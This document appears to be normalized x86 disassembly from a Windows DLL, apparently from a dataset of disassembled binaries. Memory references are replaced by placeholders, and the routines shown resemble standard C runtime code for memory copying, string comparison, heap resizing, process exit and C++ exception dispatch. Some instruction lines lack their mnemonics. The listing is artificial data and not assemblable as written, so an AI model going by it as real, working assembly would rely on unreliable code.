cmp [ edi ] 0x0
jbe r-xdata
test ecx ecx
jle r-xdata
mov [ ebp + 0x14 ] 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc ebx
jmp r-xdata
mov edx [ rw-data ]
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
mov [ ebp + 0x14 ] 0x48
jmp r-xdata
jmp r-xdata
mov [ rw-data ] 0x1
dec ecx
je r-xdata
mov cl [ eax ]
mov ebx [ rw-data ]
movzx edx cl
test [ ebx + edx * 2 + 0x1 ] 0x80
je r-xdata
mov [ ebp + 0x14 ] 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ ebx ]
mov [ eax ] cl
inc [ esi ]
inc ebx
dec [ edi ]
jmp r-xdata
cmp [ edi ] 0x1
jbe r-xdata
mov [ ebp + 0x14 ] 0x6d
jmp r-xdata
dec ecx
je r-xdata
mov ecx [ esi ]
mov dl [ eax ]
mov [ ecx ] dl
inc [ esi ]
inc eax
dec [ edi ]
dec [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi ] 0x1
jbe r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx [ esi ]
mov [ ecx ] al
inc [ esi ]
inc ebx
dec [ edi ]
mov [ ebp + 0x14 ] 0x62
jmp r-xdata
dec ecx
jne r-xdata
mov edx [ esi ]
mov [ edx ] cl
inc [ esi ]
inc eax
dec [ edi ]
mov [ ebp + 0x14 ] 0x42
jmp r-xdata
sub_1000a190
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1000a1f0 ]
jmp [ ecx * 4 + jump_table_1000a26c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a2d8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000a2d8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_1000a470 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1000a378 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000a470 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a2d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a2d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1000a2d8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000a470 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000a470 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000a470 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000a470 ]
sub_1000a4c5
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
jne r-xdata
push 0x19
call sub_1000b7a4
mov esi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10008650
pop ecx
pop ecx
jmp r-xdata
push 0x19
call sub_1000b805
mov eax [ ebp + 0xc ]
pop ecx
movzx ecx bx
sub eax ecx
neg eax
sbb eax eax
not eax
and eax esi
movzx eax bl
test [ eax + rw-data ] 0x4
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx eax bx
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
inc esi
jmp r-xdata
push 0x19
call sub_1000b805
pop ecx
xor eax eax
jmp r-xdata
movzx ecx bx
movzx eax al
shl ecx 0x8
or ecx eax
cmp [ ebp + 0xc ] ecx
je r-xdata
movzx bx [ esi ]
test bx bx
je r-xdata
push 0x19
call sub_1000b805
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
sub_1000a55c
push esi
call sub_1000a5d8
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_1000a5cf
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_1000a5cf
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_1000a5cf
mov [ eax ] 0xd
pop esi
retn
call sub_1000a5cf
mov [ eax ] 0x8
pop esi
retn
sub_1000a5e1
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_1000e840
inc eax
push eax
call sub_10008cba
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_1000b3d0
pop ecx
pop ecx
pop esi
retn
sub_1000a610
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_1000a6bc
push esi
push 0x9
call sub_1000b7a4
mov esi [ esp + 0xc ]
push esi
call sub_1000db37
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_1000b805
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
mov esi [ esi - 0x4 ]
push 0x9
sub esi 0x9
call sub_1000b805
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
sub_1000a701
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_1000f110
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_1000f110
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_1000a78c
push ebx
push esi
mov esi [ esp + 0x10 ]
cmp esi 0xffffffe0
jbe r-xdata
push 0x9
call sub_1000b7a4
mov ebx [ esp + 0x10 ]
push ebx
call sub_1000db37
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x9
call sub_1000b805
test esi esi
pop ecx
jne r-xdata
push edi
xor edi edi
cmp esi [ rw-data ]
ja r-xdata
pop esi
pop ebx
retn
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
push 0x9
call sub_1000b805
pop ecx
mov eax edi
pop edi
jmp r-xdata
push esi
push ebx
push eax
call sub_1000e342
add esp 0xc
test eax eax
je r-xdata
mov edi ebx
sub_1000a850
push edi
call sub_1000a8f5
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_1000a907
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_1000a8fe
pop edi
retn
push rw-data
push rw-data
call sub_1000a907
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_1000a921
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_1000b379
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000a9bc
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1000ac76
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_1000a9bc
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_1000b379
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
jmp sub_1000b318
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1000ab6f
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_1000b211
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_1000744d
add esp 0x14
mov ebx eax
call sub_1000b211
mov esi [ eax + 0x6c ]
call sub_1000b211
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_1000f1c4
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_1000b379
push 0x1
push esi
call sub_1000b0ae
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_1000ac19
add esp 0xc
test eax eax
jne r-xdata
call sub_1000b379
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1000ad2a
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_1000ab6f
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_1000b211
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_1000744d
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10007322
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000ad2a
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_1000ac19
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1000d0f0
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_1000ac76
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_1000b379
cmp esi [ edi + 0x4 ]
jl r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_1000b140
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1000ad2a
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_1000aeea
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_100071e2
call sub_10007224
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_1000ac76
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_1000ada5
add esp 0x2c
test eax eax
je r-xdata
sub_1000ada5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_1000b211
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_1000b211
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_1000b211
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_1000b211
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_100072a9
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_1000ae72
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000ae72
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_1000b211
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_1000b211
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_10007572
push eax
push edi
call sub_1000b0ae
pop ecx
pop ecx
sub_1000aec0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_1000aeea
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
mov esi [ ebp + 0x14 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x1
push [ esi + 0x18 ]
call sub_1000f1c4
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] 0x0
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x1
push [ ebx + 0x18 ]
call sub_1000f1c4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000b379
push 0x1
push edi
call sub_1000f1e0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000f1c4
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000f1c4
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_1000f1e0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x18 ]
mov [ edi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push 0x1
push edi
call sub_1000f1e0
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_1000f1e0
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
push [ ebx + 0x18 ]
push edi
call sub_100077a0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push [ esi + 0x18 ]
call sub_1000f1fc
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
add esi 0x8
push esi
push [ ebx + 0x18 ]
call sub_1000b115
pop ecx
pop ecx
push eax
push edi
call sub_100077a0
add esp 0xc
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test [ esi ] 0x4
je r-xdata
add esi 0x8
push esi
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_1000b115
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_10007216
jmp r-xdata
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_1000b115
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_1000721d
jmp r-xdata
push eax
call sub_1000b115
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_1000b0ae
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
push ecx
push [ eax + 0x18 ]
call sub_10007216
or [ ebp - 0x4 ] 0xffffffff
sub_1000b115
mov ecx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add eax esi
test edx edx
jl r-xdata
pop esi
retn
mov esi [ edx + esi ]
mov ecx [ ecx + 0x8 ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1000b140
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_10007595
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
